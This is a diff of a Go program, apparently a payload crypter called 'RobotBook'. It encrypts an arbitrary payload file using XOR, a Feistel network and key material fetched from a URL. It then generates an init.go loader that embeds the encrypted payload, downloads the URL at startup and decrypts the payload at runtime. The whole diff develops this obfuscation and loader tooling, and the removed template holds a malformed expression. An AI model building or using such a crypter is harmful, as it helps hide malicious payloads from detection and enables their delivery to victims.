@@ -1,12 +1,14 @@
 package main
 
 import (
+	"RobotBook/feistal"
 	"bufio"
+	"bytes"
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/hex"
 	"flag"
 	"fmt"
-	"github.com/cyrildever/feistel"
 	"io"
 	"io/ioutil"
 	"log"
@@ -19,90 +21,8 @@ import (
 
 var Chars = []string{"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/", "="}
 
-const base = `package main
-import (
-	"io/ioutil"
-	"io"
-	"net/http"
-	"log"
-	"github.com/cyrildever/feistel"
-	"bytes"
-	_ "embed"
-	"fmt"
-)
-//go:embed payload.bin
-var payloadBin []byte
-var stringPayload string
-var DecryptedPayload []byte
-
-	var Payload []byte
-
-	func xor(f []byte, key string) []byte {
-	buf := make([]byte, 1)
-	bufw := []byte{}
-	reader := bytes.NewReader(f)
-	for {
-		n, err := reader.Read(buf)
-		if err != nil {
-			if err != io.EOF {
-				log.Fatal(err)
-			}
-			break
-		}
-		bite := byte(key[n%s(len(key))])
-		writebuf := make([]byte, 0)
-		writebuf = append(writebuf, bite)
-		xord, err := XORBytes(writebuf, buf[0:n])
-		bufw = append(bufw, xord[0])
-	}
-	return bufw
-}
-
-func XORBytes(a, b []byte) ([]byte, error) {
-	if len(a) != len(b) {
-		return nil, fmt.Errorf("length of byte slices is not equivalent: %s != %s", len(a), len(b))
-	}
-
-	buf := make([]byte, len(a))
-
-	for i := range a {
-		buf[i] = a[i] ^ b[i]
-	}
-
-	return buf, nil
-}
-
-	func init(){
-		Payload = make([]byte, 64)
-		r, _ := http.Get("%s")
-		defer r.Body.Close()
-		body, _ := ioutil.ReadAll(r.Body)
-		`
-
-const feistalSetup = `
-		keys := make([]string, %d)
-`
-
-const feistalKey = `
-		keys[%d] = "%s"
-`
-
-const feistalInit = `
-		cipher := feistel.NewCustomCipher(keys)
-		stringPayload, _ = cipher.Decrypt(payloadBin)
-		DecryptedPayload = xor([]byte(stringPayload), string(Payload))
-
-`
-
 //const StringTemplate = "Payload = append(Payload, []byte(%s)...)"
 //const IntTemplate = "Payload = append(Payload, body[%d])"
-
-const StringTemplate = "Payload[%d] = []byte(%s)[0]"
-const IntTemplate = "Payload[%d] = body[%d]"
-
-const end = `
-}
-`
 
 var targetPayload string
 var targetUrl string
@@ -500,6 +420,27 @@ func xor(f *os.File, key string) []byte {
 	return bufw
 }
 
+func xorKeys(f []byte, key string) []byte {
+	buf := make([]byte, 1)
+	bufw := []byte{}
+	reader := bytes.NewReader(f)
+	for {
+		n, err := reader.Read(buf)
+		if err != nil {
+			if err != io.EOF {
+				log.Fatal(err)
+			}
+			break
+		}
+		bite := byte(key[n%(len(key))])
+		writebuf := make([]byte, 0)
+		writebuf = append(writebuf, bite)
+		xord, err := XORBytes(writebuf, buf[0:n])
+		bufw = append(bufw, xord[0])
+	}
+	return bufw
+}
+
 func main() {
 	flag.StringVar(&targetPayload, "p", "", "payload to be encoded")
 	flag.StringVar(&targetUrl, "u", "", "URL to use as a book cipher")
@@ -509,6 +450,9 @@ func main() {
 		fmt.Println("Usage: -p <payload> -u <url>")
 		return
 	}
+
+	os.Mkdir("output", 0777)
+
 	baseMap := LoadMap(targetUrl)
 	test, _ := os.ReadFile(targetPayload)
 	payload, _ := os.Open(targetPayload)
@@ -519,40 +463,48 @@ func main() {
 	xorHashString := hex.EncodeToString(xorHash)
 
 	firstXor := xor(payload, xorHashString)
-
+	fmt.Println("First Xor")
 	numPrimes := rand.Intn(20) + 10
-
+	fmt.Println("Number of primes: ", numPrimes)
 	primes := make([]int, numPrimes)
 	for i := 0; i < numPrimes; i++ {
 		primes[i] = rand.Intn(1000000) + 10000
+		fmt.Println("Prime: ", primes[i])
 	}
 
 	keyPrimes := make([]int, numPrimes)
+	fmt.Println("Key Primes")
 	for i := 0; i < numPrimes; i++ {
 		primeList := sieveOfEratosthenes(primes[i])
 		keyPrimes[i] = primeList[rand.Intn(len(primeList)-1)]
+		fmt.Println("Prime: ", keyPrimes[i])
 	}
-	keys := make([]string, numPrimes)
+	keys := make([][]byte, numPrimes)
 	for i := 0; i < len(keyPrimes); i++ {
 		keySha := sha256.New()
 		keySha.Write([]byte(strconv.Itoa(keyPrimes[i]) + xorHashString))
 		keyHash := keySha.Sum(nil)
-		keys[i] = hex.EncodeToString(keyHash)
+		keys[i] = []byte(hex.EncodeToString(keyHash))
 	}
 
-	cipher := feistel.NewCustomCipher(keys)
+	cipher := feistal.New(keys)
 
-	payloadBytes, err := cipher.Encrypt(string(firstXor))
-	if err != nil {
-		log.Fatal(err)
+	fmt.Println("Feistal Network")
+	payloadBytes := cipher.Encrypt(firstXor)
+
+	fmt.Println("Base64 Encoding Key Encryption")
+	for i := 0; i < len(keys); i++ {
+		keyXor := xorKeys([]byte(keys[i]), xorHashString)
+		keys[i] = []byte(base64.StdEncoding.EncodeToString(keyXor))
 	}
 
-	os.WriteFile("payload.bin", payloadBytes, 0644)
+	os.WriteFile("output/payload.bin", payloadBytes, 0644)
 
-	f, _ := os.OpenFile("init.go", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	f, _ := os.OpenFile("output/init.go", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	defer f.Close()
-	f.Write([]byte(fmt.Sprintf(base, "%", "d", "d", targetUrl)))
-
+	f.Write([]byte(base))
+	f.Write([]byte(funcs))
+	f.Write([]byte(fmt.Sprintf(initBlock, targetUrl)))
 	f.Write([]byte(fmt.Sprintf(feistalSetup, len(keys))))
 	for i := 0; i < len(keys); i++ {
 		f.Write([]byte(fmt.Sprintf(feistalKey, i, keys[i])))
